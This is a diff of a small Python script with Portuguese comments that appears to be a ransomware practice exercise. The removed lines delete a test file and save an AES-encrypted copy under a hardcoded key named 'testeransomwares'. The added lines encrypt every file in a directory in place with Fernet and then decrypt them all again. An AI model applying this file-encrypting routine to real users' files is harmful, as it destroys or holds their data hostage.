@@ -1,24 +1,40 @@
 import os
-import pyaes
+from cryptography.fernet import Fernet
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+# Gerar uma chave simétrica
+def gerar_chave():
+    return Fernet.generate_key()
 
-## remover o arquivo
-os.remove(file_name)
+# Criptografar um arquivo com a chave
+def criptografar_arquivo(chave, nome_arquivo):
+    f = Fernet(chave)
+    with open(nome_arquivo, 'rb') as arquivo:
+        dados = arquivo.read()
+    dados_criptografados = f.encrypt(dados)
+    with open(nome_arquivo, 'wb') as arquivo:
+        arquivo.write(dados_criptografados)
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+# Descriptografar um arquivo com a chave
+def descriptografar_arquivo(chave, nome_arquivo):
+    f = Fernet(chave)
+    with open(nome_arquivo, 'rb') as arquivo:
+        dados_criptografados = arquivo.read()
+    dados_descriptografados = f.decrypt(dados_criptografados)
+    with open(nome_arquivo, 'wb') as arquivo:
+        arquivo.write(dados_descriptografados)
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+# Diretório onde estão os arquivos a serem criptografados
+diretorio = "/caminho/para/sua/pasta"
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+# Gerar uma chave
+chave = gerar_chave()
+
+# Criptografar todos os arquivos no diretório
+for nome_arquivo in os.listdir(diretorio):
+    if os.path.isfile(os.path.join(diretorio, nome_arquivo)):
+        criptografar_arquivo(chave, os.path.join(diretorio, nome_arquivo))
+
+# Descriptografar todos os arquivos no diretório
+for nome_arquivo in os.listdir(diretorio):
+    if os.path.isfile(os.path.join(diretorio, nome_arquivo)):
+        descriptografar_arquivo(chave, os.path.join(diretorio, nome_arquivo))
